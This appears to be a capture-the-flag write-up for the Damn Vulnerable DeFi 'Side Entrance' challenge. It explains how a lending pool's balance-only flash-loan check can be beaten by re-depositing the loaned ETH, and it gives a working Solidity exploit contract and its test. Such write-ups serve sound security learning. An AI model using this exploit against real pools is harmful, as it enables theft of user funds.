# Statement:

<img width="843" height="515" alt="image" src="https://github.com/user-attachments/assets/1536398f-c45b-471b-98fc-c38ccf42af88" />

<br><br><br><br><br><br>

## Problem Statement

Goal (from the challenge):

Drain all ETH from SideEntranceLenderPool and send it to the provided recovery address. 
Damn Vulnerable DeFi

### The pool:

- Already holds 1000 ETH
  
### Lets anyone:

- deposit() ETH
- withdraw() their balance
- Take a free flashLoan() of ETH

We start with 1 ETH, and need to rescue all ETH from the pool to the recovery account.

<br><br><br><br><br><br>

## Examining the Smart Contract:

We care about three functions in SideEntranceLenderPool.sol :

### 1. deposit()

- `msg.value` is added to an internal `balances[msg.sender]` mapping.
- The ETH is kept in the contract itself (i.e., the pool’s balance grows).
- Uses an unchecked block for gas, but that’s irrelevant to the bug — just a micro-optimization.

Effectively:

“Add ETH to the pool and credit it to the sender’s internal balance.”

### 2. withdraw()

Looks up `balances[msg.sender]`

Resets that balance to zero

Transfers that entire amount of ETH back to `msg.sender`

So if the pool thinks you’ve deposited X ETH at some point, you can later call `withdraw()` and pull out that X ETH.


### 3. flashLoan(uint256 amount)

Roughly:

Checks that amount is not more than the contract’s ETH balance.

Sends the ETH to a borrower via:

`IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();`


After the callback, it checks that the pool’s ETH balance is at least what it was before:

`require(address(this).balance >= balanceBefore, "Flash loan not paid back");`

<br><br><br><br><br><br>

## Vulnerability

The bug is in the interaction between:

- `flashLoan()`’s repayment check (purely ETH balance-based), and

- `deposit()`’s accounting (credits `balances[msg.sender]` when ETH hits the contract).
  

### During the flash loan:

- The pool sends you amount ETH in `execute{value: amount}()`.

- You’re free to do whatever you want with it in your `execute() `callback.

- If, inside `execute()`, instead of directly “repaying” the loan, we just call:

`pool.deposit{value: msg.value}();`

### From the pool’s perspective:

ETH balance goes back up → the `flashLoan()` check passes.

### From the internal accounting perspective:

We are now credited with amount in `balances[attackerContract]`.

<br><br><br><br>

# Here is how the attack works:

<img width="596" height="348" alt="image" src="https://github.com/user-attachments/assets/65473d7c-3bb6-4165-b34a-5efc89306973" />

<br><br><br><br>

# Exploit Code:
<br><br>
## SideEntranceExploiter.sol:

``` solidity
pragma solidity ^0.8.0;
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
contract SideEntranceExploiter{
    SideEntranceLenderPool public pool;
    address public recovery;
    uint public exploitAmount;

    constructor(address _pool, address _recovery, uint _amount){
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
        exploitAmount = _amount;
    }

    function attack() external returns(bool){
        pool.flashLoan(exploitAmount);
        pool.withdraw();
        payable(recovery).transfer(exploitAmount);
        return true;
    }

    function execute() external payable{
        pool.deposit{value: msg.value}();
    }

    receive() external payable{}
}
```

## SideEntrance.t.sol:

``` solidity
    /**
     * CODE YOUR SOLUTION HERE
     */

    function test_sideEntrance() public checkSolvedByPlayer {
        SideEntranceExploiter exploiter = new SideEntranceExploiter(address(pool), recovery, ETHER_IN_POOL);
        require(exploiter.attack());
    }

```
